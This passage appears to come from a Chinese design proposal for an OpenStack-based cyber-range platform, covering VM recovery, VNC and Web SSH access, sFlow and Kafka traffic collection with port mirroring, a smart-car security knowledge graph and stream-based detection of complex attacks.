通过监听消息队列来收取bandwidth信息。</p><p>同一子网下虚拟机互相访问不会统计，但不同子网间进过虚拟路由器的流量会被统计，虚拟机与外部网络互访也会统计（有floatingip)，实现虚拟机从崩溃中自动恢复到初始状态或手动选择崩溃节点的处理方式。</p><p>用sersync直接同步整个chroot环境，当成功创建一台虚拟机时，把存储上的对应业务文件传送到新实例上即可运行，不过就如上面所说，由于同步的是整个chroot环境，chroot环境本身也可能会很大，其中相当大一部分数据可能并不需要同步，项目经常会产生大量的日志文件，动辄上百G的日志文件，是没有必要同步的。不过确实方便配置管理。</p><p>重新启动的方式包括软重启和硬重启：使用nova api方式，软重启：nova reboot SERVER，硬重启方式：nova reboot –hard SERVER。</p><p>实现虚拟节点状态保存和恢复，并提供配置接口：虚拟节点的保存和恢复都是通过基础镜像以及镜像的增量来实现的。例如在实例文件instance-0000001a中有console.log disk disk.local libvirt.xml等三个文件，console.log 保存虚拟机启动的日志信息，disk 和 disk.local为虚拟机实例的镜像增量文件，libvirt.xml为配置文件。通过horizon可以提供修改这些配置文件的途径，通过修改配置文件，生成多个状态，以支持保存多个虚拟机状态。</p><p>实现对目标网络配置数据、虚拟机状态数据进行回放的接口：目标网络配置数据是horizon通过获取network db数据进行回放，虚拟机状态数据是horizon通过获取compute db数据进行回放，支持通过Web桌面、远程桌面、Web SSH的方式接入网络节点，通过虚拟机提供的vncserver 服务，每次点击远程桌面的时候，页面会传一个vm的标识到action中，action判断这个vm是否属于登录的这个用户，然后在数据库中取出这台vm的vnc服务的ip+port，写成一个配置文件target-config指定目录下，最后把websockets代理机器的ip+port以及vm vnc的password通过action传到vnc_auto.html中，远程桌面采用的是一种类似TELNET的技术，他是从TELNET协议发展而来的。通俗的讲他就是图形化的TELNET.</p><p>Web SSH的方式是利用web模拟ssh方式连接终端机：支持利用虚拟机自省技术对虚拟机进行高速、无感的周期性和单次内部数据监控，虚拟机自省技术对正在运行中的底层虚拟机的运行细节进行监视的功能，监视的功能是由观察内存细节，陷入硬件事件和读取CPU寄存器来完成的，下图表示这一过程。</p><p>LibVMI是一个标准C语言库，而且在vmi初始化的过程中就读取了guest的System.map，因此在这个文件中对符号名进行匹配就可以获取到符号的虚拟地址了，下面是这个过程的代码，可以看到，代码先是在sym–&gt;虚拟地址的缓存中进行查找，当没有找到后才去system.map中读取，并且将读取到的结果缓存到符号cache中。这样就获取到了一个符号的虚拟地址，接下来还要进行读取这个虚拟地址内容的过程。</p><h2 id="网络链路采集模块"><a href="#网络链路采集模块" class="headerlink" title="网络链路采集模块"></a>网络链路采集模块</h2><ul><li>具备对指定节点的流量进行采集能力，能够通过试验过程导调配置需要采集的节点及端口；采集后的流量支持通过交换机汇聚到流量存储和分析设备进行统一存储和分析，流量汇聚交换机需采用华为、华三等品牌的通用三层交换机，无需SDN等功能，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f4847ef9c546dc2999c3a9112b927688.png" alt="1703513197056"></p><p>指定节点采集</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7343a511591cd95af4c5be5d939a7ab4.jpeg" alt="nginx配置流量镜像以及验证方式_网站&amp;服务器&amp;网络安全_产品知识库_动易技术中心"></p><p>流量存储采集</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/67f06430c68196f00ac7b0c093d4d92e.png"></p><p>无需SDN的端口镜像汇聚</p><p>功能参数设计为，系统支持利用sFlow协议对虚拟网络流量进行采集，并能将采集的数据发送至Kafka，供其他分系统使用。系统具备对指定节点流量的采集能力，可通过试验过程导调配置需要采集的节点及端口。采集后的流量能通过通用三层交换机（如华为、华三品牌）汇聚到流量存储和分析设备进行统一存储和分析。此外，系统还支持通过流量镜像的方式，将虚拟机某端口的流量镜像到指定设备端口。</p><p>性能参数设计为，系统的流量采集速率达到10Gbps，能够支持200条链路的同时采集。这种设计确保了在大规模网络环境下高效、稳定的流量监控和分析能力，满足复杂网络环境中对流量管理和安全监控的高要求。</p><h4 id="方案设计-6"><a href="#方案设计-6" class="headerlink" title="方案设计"></a>方案设计</h4><p>功能参数设计为，系统支持利用sFlow协议对虚拟网络流量进行采集，并能将采集的数据发送至Kafka，供其他分系统使用。系统具备对指定节点流量的采集能力，可通过试验过程导调配置需要采集的节点及端口。采集后的流量能通过通用三层交换机（如华为、华三品牌）汇聚到流量存储和分析设备进行统一存储和分析。此外，系统还支持通过流量镜像的方式，将虚拟机某端口的流量镜像到指定设备端口。</p><p>性能参数设计为，系统的流量采集速率达到10Gbps，能够支持200条链路的同时采集。这种设计确保了在大规模网络环境下高效、稳定的流量监控和分析能力，满足复杂网络环境中对流量管理和安全监控的高要求。</p><h5 id="系统概要"><a href="#系统概要" class="headerlink" title="系统概要"></a>系统概要</h5><p>本竞赛管理系统将提供一个全面的流量监控与分析解决方案，以支持网络安全竞赛中对虚拟网络流量的采集、处理和分析。系统将采用sFlow协议进行流量采集，并利用Kafka进行数据传输，以实现流量数据的高效处理和分析。</p><h5 id="流量采集与传输"><a href="#流量采集与传输" class="headerlink" title="流量采集与传输"></a>流量采集与传输</h5><p>sFlow协议采集</p><p>系统将基于sFlow协议对虚拟网络的流量进行采集。sFlow是一个行业标准，适用于监控高速网络，它能够提供网络流量的实时采样。</p><p>采集的数据将发送至Kafka消息队列，Kafka作为高吞吐量的分布式消息系统，将为其他分系统提供实时数据流。</p><p>节点流量采集</p><p>系统将具备对指定节点的流量进行采集的能力，管理员可以通过试验过程导调配置需要采集的节点及端口。</p><p>采集后的流量数据将通过通用三层交换机（如华为、华三等品牌）汇聚到流量存储和分析设备进行统一存储和分析。</p><p>流量镜像</p><p>系统支持通过流量镜像的方式，将虚拟机某个端口的流量镜像到指定设备的端口。这允许管理员在不干扰主要网络流量的情况下，实时监控和分析网络数据。</p><h5 id="流量存储与分析"><a href="#流量存储与分析" class="headerlink" title="流量存储与分析"></a>流量存储与分析</h5><p>存储</p><p>系统将使用高性能的存储解决方案来存储采集的流量数据。这将确保即使在大规模数据采集情况下，数据也能被安全、可靠地存储。</p><p>分析</p><p>采集到的流量数据将被用于进一步的分析。分析工具将能够识别流量模式、潜在的安全威胁和网络性能问题。</p><p>系统将提供可视化工具，以帮助管理员理解流量数据，进行必要的调整或优化。</p><h5 id="性能设计-1"><a href="#性能设计-1" class="headerlink" title="性能设计"></a>性能设计</h5><p>流量采集速率</p><p>系统将能够处理高达10Gbps的流量采集速率，以满足高速网络环境下的监控需求。</p><p>链路采集能力</p><p>系统支持同时对200条链路进行流量采集，确保即使在多节点、高密度的竞赛环境中，也能够有效地监控网络流量。</p><h5 id="系统设计细节"><a href="#系统设计细节" class="headerlink" title="系统设计细节"></a>系统设计细节</h5><p>高性能交换机配置</p><p>流量汇聚交换机将配置必要的VLAN、ACL和路由规则，以确保数据的准确汇聚和传输。</p><p>交换机的端口将配置为镜像端口，以复制经过的流量到分析设备。</p><p>安全与合规</p><p>所有流量采集和分析操作将遵守相关的数据保护法规和隐私政策。</p><p>系统将实施适当的安全措施，以保护存储和传输的数据不被未经授权的访问。</p><p>可扩展性</p><p>系统设计将考虑未来的扩展性，支持更多节点的添加和更高速率的流量采集需求。</p><p>Kafka集群将配置以支持高可用性和扩展性，以应对大量数据流的需求。</p><p>本竞赛管理系统的流量监控与分析方案将为网络安全竞赛提供一个强大的支持工具，能够满足高速、大规模网络流量监控的需求。系统的设计将确保数据的高效采集、安全存储和深入分析，为竞赛管理员提供实时的网络状态信息，帮助他们有效地管理和监督竞赛过程。</p><h4 id="方案简介-4"><a href="#方案简介-4" class="headerlink" title="方案简介"></a>方案简介</h4><p>流量采集模块是针对网络攻防效果评测的重要方法，是网络仿真软件的关键环节。实现了多种链路的协同、高性能采集，可对大规模网络仿真场景有效地进行基于数据采集的效果评估。</p><p>根据虚拟主机间通信所处的计算节点位置不同，分为三种链路：同一计算节点内的虚拟主机之间的通信链路属于宿主机内的虚拟链路，不同计算节点内的虚拟主机之间的通信链路属于宿主机间的虚拟链路，计算节点内的虚拟主机与实物机之间的通信链路属于虚实互联链路，实物机靠网络节点连接的外网接入云平台中。</p><p>基于上述网络仿真系统，该数据采集与效果评估体系结构包括采集点映射模块、数据采集模块、数据存储模块以及效果评估模块共四个模块。其中采集点映射模块包括配置解析模块、IP地址解析模块和端口解析模块三个子模块，利用这三个子模块确定目标链路的目标端口，即采集点；数据采集模块是该体系的核心部分，完成对采集点的数据采集；数据存储模块分为本地存储和远程存储，本地存储是指将采集数据直接存在计算节点本地的数据库中，远程存储是将采集数据存入云平台之外的服务器的数据库中；效果评估模块基于实时采集的数据进行提取、分析和计算，完成对网络安全试验效果的评估。</p><p>传统的数据采集存储只提供了本地存储的功能，本软件采用的数据采集系统，实现了本地存储和远程服务器实时存储的双重功能，远程存储通过将采集数据复制备份到独立的服务器，实现了实验数据的安全隔离，为后续的进一步研究提供了数据保障。对采集点进行采集并实时对所采集数据进行存储的具体步骤为：</p><p>1、启动数据采集程序，使用监测进程对数据文件目录进行监听；</p><p>2、对生成的数据文件，采用压缩算法进行压缩；</p><p>3、将压缩文件发送给接收端服务器；</p><p>4、服务端接收到压缩文件，先进行解压缩，再将数据文件解析入库；</p><p>5、通过对数据库中的数据进行提取、分析、计算，完成试验效果评估。</p><p>通过试验验证，远程存储数据可以用来支持后面的效果评估。</p><p>使用案例：在OpenStack中构建虚拟网络，网络拓扑如下图所示，图中vm1，vm2，vm3表示虚拟主机，IP地址分别为11.0.0.4，13.0.0.5，11.0.0.5，vm5是实物机PC，通过虚实互联方式接入OpenStack平台，router是虚拟路由器，IP地址为11.0.0.3,13.0.0.3,15.0.0.3，net11，net13，net15代表虚拟网络，网络地址分别为11.0.0.0/24，13.0.0.0/24，15.0.0.0/24，其中vm1，vm2在同一计算节点（Compute1）上，vm3在另一计算节点（Compute2）上。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/44c897a4debb41b2bb829d1f12ba41db.png"></p><p>构建虚拟网络</p><p>选择上图三条链路：（vm1, vm2, Compute1），（vm3, Compute2, vm2, Compute1），（vm2, Compute1, vm5）。上述三条链路的通信都通过router，首先确定采集点，router有3个网卡，此处需要的是与router在 net11和net15的网卡相连的br-int的两个目标端口（端口1，端口2），获取router的采集点映射表，得出两个目标端口位于同一计算节点Compute1上，需要对这两个端口设置流量镜像。为验证流量镜像的有效性，用vm1，vm3， vm5分别向vm2发送10个ICMP数据包，结果从镜像口接收到60个ICMP数据包（ICMP数据包是双向的），验证流量镜像设置成功。</p><p>为验证该系统的链路数据采集性能，对上图中的链路（vm1, vm2, Compute1）进行测试，用vm1上的iperf发包工具向vm2发包，采集端口1，分别测试 libpcap（Linux自带的传统采集方法），pf_ring和该系统测试在捕获不同长度数据包时的采集速率，测试结果通过下图显示。</p><p>可以看出，随着帧长度增大，libpcap和本系统每秒钟收包速率均逐渐减小，pf_ring的收包速率趋于稳定，说明在数据传输过程中小包比较容易被接收，且利用本系统达到的采集速率明显优于libpcap和pf_ring的采集速率，采集速率相较于pf_ring最高提升了88.48%，验证了该采集系统的高效性。</p><p>采集效率</p><p>评判采集性能的重要指标还包括CPU占用率，程序运行时CPU占用率越小，程序性能越好。为了测试本系统的CPU占用率，将libpcap和pf_ring作为对照组，测试三种数据包捕获方法在捕获不同长度数据包时的CPU占用率，测试结果如下图所示。</p><p>三种抓捕方法的cpu占用率</p><p>可以看出，在帧长增大时，三种采集方法的CPU利用率有轻微波动，整体趋于稳定，libpcap 的CPU占用率在82%~83%，pf_ring的CPU占用率在80%~81%，二者在CPU负载平衡方面性能相当，而用本系统CPU占用率平均在43%，相较于libpcap和pf_ring，使用本系统，CPU占用率降低了45.29%，大大降低CPU使用率，有效提高了采集效率。</p><p>支持虚拟网络的流量对基于sFlow协议进行采集，采集的数据可以发送至Kafka供其他分系统使用；支持通过流量镜像方式从虚拟机某个端口流量镜像到指定设备的端口，如下图所示。</p><p>系统具备专门针对指定节点的流量采集功能，允许用户在实验或比赛过程中配置和选定特定的节点及其端口以进行流量捕获。一旦采集完毕，所捕获的流量数据可以通过交换机被汇聚到专门的流量存储和分析设施，以实现集中化的数据存储和后续分析。为了确保技术的兼容性和性能，所使用的流量汇聚交换机需选用华为、华三等知名品牌的通用三层交换机。界面如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8b306dbabe2a706a582dd4197292d786.png"></p><p>：流量采集</p><p>性能参数如下：</p><ul><li>流量采集速率不低于10Gbps；</li><li>支持等于200条链路同时采集。</li></ul><h2 id="多元网络安全知识库模块"><a href="#多元网络安全知识库模块" class="headerlink" title="多元网络安全知识库模块"></a>多元网络安全知识库模块</h2><ul><li>支持面向智能汽车网络安全知识的可视化数据管理，支持对智能汽车复杂攻击场景图谱方式呈现与拖拽查看，提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/64915711cd449c314f049238d341de69.png"></p><p>拖拽式图谱</p><p>功能参数设计为，系统支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理和快速检索功能。能够实现面向智能汽车网络安全知识的可视化数据管理，支持复杂攻击场景图谱的呈现与拖拽查看。系统还支持智能汽车知识数据管理，包括按模板批量导入、导出与删除漏洞知识、基础攻击子图和复杂攻击子图。</p><p>系统具备智能汽车网络安全知识模式实体管理功能，统一表示与管理漏洞、资产、基础攻击、复杂攻击知识体。智能汽车网络安全知识模式关系管理包括复杂攻击与基础攻击的包含关系、基础攻击与安全事件的实例关系、安全事件与漏洞的利用关系、漏洞与资产的存在影响关系。系统还支持多知识图谱的动态构建与管理，为每次试验构建具有时空特征的独立知识图谱。</p><p>性能参数设计为，系统支持高达10万条漏洞知识的存储管理，以及20万条资产知识的存储管理。这种设计能够满足大规模智能汽车网络安全知识的管理和应用需求，为智能汽车安全研究和应对提供强大的数据支持和知识基础。</p><h4 id="方案设计-7"><a href="#方案设计-7" class="headerlink" title="方案设计"></a>方案设计</h4><p>功能参数设计为，系统支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理和快速检索功能。能够实现面向智能汽车网络安全知识的可视化数据管理，支持复杂攻击场景图谱的呈现与拖拽查看。系统还支持智能汽车知识数据管理，包括按模板批量导入、导出与删除漏洞知识、基础攻击子图和复杂攻击子图。</p><p>系统具备智能汽车网络安全知识模式实体管理功能，统一表示与管理漏洞、资产、基础攻击、复杂攻击知识体。智能汽车网络安全知识模式关系管理包括复杂攻击与基础攻击的包含关系、基础攻击与安全事件的实例关系、安全事件与漏洞的利用关系、漏洞与资产的存在影响关系。系统还支持多知识图谱的动态构建与管理，为每次试验构建具有时空特征的独立知识图谱。</p><p>性能参数设计为，系统支持高达10万条漏洞知识的存储管理，以及20万条资产知识的存储管理。这种设计能够满足大规模智能汽车网络安全知识的管理和应用需求，为智能汽车安全研究和应对提供强大的数据支持和知识基础。</p><h5 id="系统概览"><a href="#系统概览" class="headerlink" title="系统概览"></a>系统概览</h5><p>本设计方案旨在创建一个智能汽车网络安全知识管理系统，该系统将支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理和快速检索功能。系统的核心功能将包括可视化数据管理、知识数据管理、实体与关系管理以及多知识图谱的动态构建与管理。性能参数将确保系统支持大规模的知识存储和管理需求。</p><h5 id="功能细化"><a href="#功能细化" class="headerlink" title="功能细化"></a>功能细化</h5><p>知识存储管理与检索</p><p>系统将支持智能汽车漏洞知识、资产知识、基础攻击知识子图和复杂攻击知识子图的存储管理。</p><p>通过高效的索引和查询优化，系统将提供快速检索功能，确保用户能够迅速获取所需的安全知识信息。</p><p>可视化数据管理</p><p>系统将支持面向智能汽车网络安全知识的可视化数据管理。</p><p>用户能够通过图谱方式呈现智能汽车复杂攻击场景，并支持拖拽查看细节，以便于理解和分析安全威胁。</p><p>知识数据管理</p><p>系统将支持智能汽车知识数据管理，包括按模板批量导入、批量导出与删除。</p><p>这包括漏洞知识、基础攻击子图和复杂攻击子图，从而提高数据处理的效率和准确性。</p><p>实体管理</p><p>系统将支持智能汽车网络安全知识模式实体管理。</p><p>这涉及对漏洞、资产、基础攻击、复杂攻击知识体的统一表示与管理，确保数据一致性和完整性。</p><p>关系管理</p><p>系统将支持智能汽车网络安全知识模式关系管理。</p><p>这包括管理复杂攻击与基础攻击的包含关系、基础攻击与安全事件的实例关系、安全事件与漏洞的利用关系、漏洞与资产的存在影响关系等。</p><p>多知识图谱管理</p><p>系统将支持多知识图谱的动态构建与管理。</p><p>对于每次试验，系统能够构建独立的、具有时空特征的知识图谱，以满足不同试验场景的需求。</p><h5 id="性能设计-2"><a href="#性能设计-2" class="headerlink" title="性能设计"></a>性能设计</h5><p>漏洞知识存储管理</p><p>系统将支持10万漏洞知识的存储管理，保证能够处理大量的漏洞信息。</p><p>资产知识存储管理</p><p>系统将支持20万资产知识的存储管理，确保资产信息的完整性和可用性。</p><h5 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h5><p>数据存储</p><p>采用分布式数据库技术，如NoSQL数据库，以支持高效的数据存储和快速检索。</p><p>数据库将优化索引结构，以加速查询性能。</p><p>可视化界面</p><p>利用现代Web技术如HTML5和SVG，提供丰富的用户界面，支持图谱的动态展示和用户交互。</p><p>可视化工具将支持自定义视图和图层，以适应不同用户的需求。</p><p>数据管理</p><p>提供一套完整的数据管理工具，支持数据的导入、导出、更新和删除。</p><p>数据模板将支持XML、JSON等格式，以便于数据的交换和集成。</p><p>实体与关系管理</p><p>开发实体关系管理模块，以支持复杂的知识表示和关系维护。</p><p>使用图数据库技术来表示和存储复杂的实体关系。</p><p>知识图谱构建</p><p>实现动态知识图谱构建引擎，支持知识的自动关联和图谱的生成。</p><p>知识图谱将支持时空特征，以适应不同的试验和分析场景。</p><h5 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h5><p>前端</p><p>前端将采用响应式设计，以支持不同设备和屏幕尺寸。</p><p>提供用户友好的导航、搜索和过滤功能。</p><p>后端</p><p>后端将采用微服务架构，以提供灵活的服务部署和扩展性。</p><p>实现API接口，以支持前端和其他系统的数据交互。</p><p>安全性</p><p>系统将实施严格的安全措施，包括数据加密、用户认证和访问控制。</p><p>定期进行安全审计和漏洞扫描，以确保系统的安全性。</p><p>本智能汽车网络安全知识管理系统设计方案提供了一个全面的解决方案，支持智能汽车网络安全知识的存储、管理、检索和可视化。系统的性能参数保证了大规模知识的处理能力，技术实现考虑了系统的可用性、可扩展性和安全性。通过该系统，用户可以有效地管理和分析智能汽车网络安全知识，以支持网络安全研究和教育。</p><h4 id="方案简介-5"><a href="#方案简介-5" class="headerlink" title="方案简介"></a>方案简介</h4><p>多元网络安全知识库主要支撑建立网络安全场景知识图谱，基于漏洞数据、弱点数据以及攻击数据，建立网络安全知识体系，结合漏洞、基础攻击、弱点和复杂攻击等知识构建网络安全知识图谱。并支持对攻击知识、弱点、漏洞、智能汽车资产管理，以及拥有基础攻击知识子图、复杂攻击知识子图、资产知识以及漏洞知识的高效检索与存储管理功能。</p><p>多元网络安全知识库是知识管理系统的多年应用基础上，综合了当前智能汽车网络安全知识领域的管理需求和业务需求，在网络安全有关专家的指导下，结合网络安全攻击行为分析、攻击检测等业务的扩展，设计与研发出的网络安全知识管理系统。基于多元网络安全知识库的需求分析和架构设计，实现系统的功能划分如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f734e829763ec036dc0156c8a5f05849.png"></p><p>知识库管理主要是管理智能汽车网络安全知识库实体管理，包括漏洞库、资产库、基础攻击知识库、复杂攻击知识库、知识图谱库的统一表示与管理。漏洞知识的存储管理高达12.8万条，资产知识的存储管理高达22.1万条。</p><p>知识全生命周期管理是针对知识产生、知识分类、知识存储、知识应用、更新迭代、停用删除进行管理。网络安全知识产生有三种方式单条新建、批量导入，单条新建是在系统中，线上进行网络安全知识录入，并提交多元网络安全知识库；批量导入是通过知识导入模板，线下进行知识梳理，将梳理结果批量导入多元网络安全知识库。知识分类是将产生的数据，按照一定的规则分类为资产、漏洞、攻击知识。知识存储是将知识存储到知识库，存储方式主要是数据库，存储的时候充分考虑知识的安全性、可访问性和可搜索性。知识应用是指将存储的知识应用于攻击检测、安全分析评估等实际问题解决、决策制定中。因知识不是静态的，它需要不断更新和迭代以保持其有效性和实用性，因此更新迭代模块是及时在知识库中添加新信息、修订过时的内容、跟踪最新的行业知识。针对不再需要的知识或过时的知识，通过停用删除模块进行停用和删除，从而减少知识库的混乱和信息冗余。支持按模板批量导入、批量导出与删除，包括复杂攻击子图、基础攻击子图以及漏洞知识。</p><p>知识访问控制是控制用户角色能够访问哪些知识资源以及在什么条件下可以访问，包括读取权限和写入权限。为了确保只有经过身份验证的用户可以访问知识，通常需要采用用户身份验证机制，如用户名和密码等，这有助于保护知识不受未经授权的访问。同时，会基于用户的角色或职责来管理的，不同角色的用户被授予不同级别的访问权限，如管理员可能具有更广泛的权限，而普通员工可能只能查看特定的知识。针对访问记录进行必要的日志记录，有利于监控和追踪知识的访问历史，以便在发生问题或安全事件时进行调查和审计。</p><p>知识统计是针对不同类型的知识进行不同维度统计，便于直观了解知识情况，比如数量统计、类型统计、分数统计、程度统计等。</p><p>知识备份主要应用于环境变化比如服务器搬迁等场景，将知识备份到另一位置，保证知识免受损坏、丢失等。</p><p>可进行多知识图谱的动态构建与管理，能够为每次试验构建独立的、具有时空特征的知识图谱。</p><p>多元网络安全知识库模块元素主要包括知识库和知识管理两大类别。其中知识库元素如下表所示：</p><table><thead><tr><th>序号</th><th>知识库名称</th><th>内容描述</th></tr></thead><tbody><tr><td></td><td>资产库</td><td>资产库包含汽车相关的硬件资产、操作系统资产、软件资产，资产元素主要包括资产类型、资产名称、资产IP等信息。</td></tr><tr><td></td><td>漏洞库</td><td>漏洞库中漏洞覆盖硬件漏洞、操作系统漏洞、软件系统漏洞，实现对漏洞数据的集中管理，包括漏洞CVE/CNVD/CNNVD编号、首发时间、危害等级、漏洞类型、威胁类型、漏洞描述。</td></tr><tr><td></td><td>弱点知识库</td><td>弱点知识库是对弱点数据的集中管理，包括CWE编号、弱点名称、描述、关系、适用平台、常见后果、利用可能性、缓解措施。</td></tr><tr><td></td><td>基础攻击库</td><td>基础攻击库是对基础攻击的集中管理，可将基础攻击分为探测类、攻击突破类、远程控制、窃取利用类等，描述了包括攻击描述、攻击可能性、威胁等级、技能要求、资源要求、先决条件、执行流程、后果、缓解措施、相关脆弱性、创建时间、修改时间等信息；</td></tr><tr><td></td><td>复杂攻击库</td><td>复杂攻击是对复杂攻击的集中管理，包括各个攻击步骤的基础攻击名称、利用的漏洞、使用的攻击工具等信息。</td></tr><tr><td></td><td>基础攻击子图库</td><td>基础攻击子图库是管理基础攻击子图，包括基础攻击与安全事件的关系、安全事件与漏洞的关系、漏洞与资产的关系。</td></tr><tr><td></td><td>复杂攻击子图库</td><td>复杂攻击子图库是管理复杂攻击子图，包括由哪些基础攻击子图组成。</td></tr></tbody></table><p>知识管理主要包括可视管理和后台管理。可视管理是将智能汽车相关知识采用图谱方式管理，通过节点（Nodes）和边（Edges）表示和描述图中的数据、实体和它们之间的关系，支持对智能汽车复杂攻击场景图谱方式呈现与拖拽查看。节点可以表示资产、漏洞、攻击知识，每个节点通常都有一个唯一的标识符，节点可以包含属性或标签用于描述节点的特征或属性。边可以表示这些知识之间的关联关系，边通常具有方向表示连接的起点和终点，边可以带有属性用于描述关系的特征或属性比如复杂攻击之间的空间属性。后端管理主要是针对知识进行统一删除、批量导入、批量导出、更新、展示等。边用来管理智能汽车网络安全知识模式关系，包括复杂攻击与基础攻击的包含关系、安全事件以及基础攻击之间的实例关系、漏洞以及安全事件之间的利用关系、资产以及漏洞之间存在影响关系。</p><h2 id="复杂攻击知识匹配流计算模块"><a href="#复杂攻击知识匹配流计算模块" class="headerlink" title="复杂攻击知识匹配流计算模块"></a>复杂攻击知识匹配流计算模块</h2><h4 id="方案设计-8"><a href="#方案设计-8" class="headerlink" title="方案设计"></a>方案设计</h4><p>功能参数设计为，系统支持智能汽车攻击子图模式的注册与管理，基于消息队列和子图状态。随着智能汽车攻击子图更新，流计算安全知识匹配加载模块同步更新。系统支持基于试验场景知识的智能汽车复杂攻击检测场景流式计算，覆盖车云协同业务场景。针对多试验并发的复杂攻击检测实现高并发流计算，确保不同试验并发计算任务互不干扰。智能汽车攻防演练结束后，根据试验状态注销相应的攻击子图。系统还支持实时流式接收智能汽车安全事件，进行在线知识匹配与关联分析。</p><p>性能参数设计为，系统支持复杂攻击实时计算的并发数量达100个，能够在12小时内进行数据流在线匹配关联分析。</p><h5 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h5><p>随着智能汽车技术的迅猛发展，车联网安全面临的威胁日益增多。为了保障智能汽车系统的安全性，本方案提出了一个网络安全实时监测与攻击检测系统。该系统将支持智能汽车攻击子图模式的注册与管理，流计算安全知识的匹配加载，复杂攻击的流式计算检测，以及实时的安全事件分析。</p><h5 id="系统设计要求概述"><a href="#系统设计要求概述" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h5><p>本系统设计将实现以下关键要求：</p><p>攻击子图模式注册与管理</p><p>支持智能汽车攻击子图模式的注册与管理，基于消息队列和子图状态的模式注册。</p><p>流计算安全知识匹配加载模块更新</p><p>随智能汽车攻击子图的更新变化，流计算安全知识匹配加载模块将实时更新。</p><p>复杂攻击检测场景流式计算</p><p>支持基于试验场景知识的智能汽车复杂攻击检测场景流式计算，涵盖车云协同业务场景。</p><p>高并发流计算</p><p>支持针对多试验并发进行的复杂攻击检测高并发流计算，确保不同试验并发计算任务互相独立。</p><p>攻防演练结束后的攻击子图注销</p><p>支持智能汽车攻防演练结束后，根据试验状态注销试验对应的攻击子图。</p><p>实时流式安全事件接收与分析</p><p>支持实时流式接收智能汽车安全事件，并进行在线知识匹配与关联分析。</p><h5 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h5><p>复杂攻击实时计算并发</p><p>系统将支持复杂攻击实时计算并发100个。</p><p>在线匹配关联分析</p><p>系统支持12小时内的数据流在线匹配关联分析。</p><h5 id="系统设计详述"><a href="#系统设计详述" class="headerlink" title="系统设计详述"></a>系统设计详述</h5><p>攻击子图模式管理</p><p>系统将引入一个高效的注册与管理机制，用于智能汽车攻击子图模式。该机制将基于消息队列技术，如Kafka或RabbitMQ，实现子图状态的实时更新和注册。这将允许系统动态地添加、修改或删除攻击模式，以响应新的威胁和漏洞。</p><p>流计算安全知识更新</p><p>随着攻击子图的连续更新，系统内部的流计算模块将同步更新安全知识库。这一模块将利用流处理框架，如Apache Flink或Apache Storm，实现实时数据处理和复杂事件处理。</p><p>复杂攻击检测流式计算</p><p>系统将采用流式计算框架对智能汽车复杂攻击场景进行实时监控和检测。该功能将支持基于试验场景知识的计算，覆盖车云协同等多种业务场景，确保在多变的攻击环境中保持高效的检测能力。</p><p>高并发流计算设计</p><p>为了处理多试验场景下的并发计算需求，系统将设计高并发流计算架构。每个试验将在独立的计算资源上运行，确保计算任务之间的隔离性，防止资源争抢和数据干扰。</p><p>攻击子图注销机制</p><p>智能汽车攻防演练结束后，系统将提供一种机制，根据试验状态自动注销相关的攻击子图。这包括清理内存中的数据、更新数据库状态以及释放计算资源。</p><p>实时流式安全事件处理</p><p>系统将具备实时接收智能汽车安全事件的能力，并支持在线知识匹配与关联分析。这将利用复杂事件处理技术，结合安全知识库，实现对攻击行为的快速识别和响应。</p><h5 id="技术实现方案"><a href="#技术实现方案" class="headerlink" title="技术实现方案"></a>技术实现方案</h5><p>消息队列与流计算集成</p><p>系统将集成消息队列和流计算框架，以实现高效的数据传输和处理。消息队列将负责在系统各部分之间传递消息，而流计算框架将处理这些消息，执行实时的安全分析。</p><p>安全知识库</p><p>安全知识库将作为系统的核心组件，存储所有攻击模式、漏洞信息和安全事件。知识库将采用图数据库来存储复杂的关系数据，并支持快速的图查询。</p><p>并发控制</p><p>系统将采用容器化技术，如Docker或Kubernetes，来实现高并发计算任务的隔离和管理。每个容器将运行独立的试验场景，确保系统资源的有效利用。</p><p>安全事件接收与分析</p><p>实时数据流将通过网络传感器、日志收集器等方式接收，然后通过流计算框架进行处理。系统将利用机器学习和模式识别算法，提高安全事件的检测精度。</p><p>本系统设计方案提供了一个全面的智能汽车网络安全监测与攻击检测解决方案。通过集成先进的消息队列、流计算技术和图数据库，系统将能够实时监测并响应智能汽车网络的安全威胁。高并发流计算设计保证了系统在多试验场景下的性能，而实时流式安全事件处理功能能够快速匹配和关联安全事件，提供有效的安全保障。</p><h4 id="方案简介-6"><a href="#方案简介-6" class="headerlink" 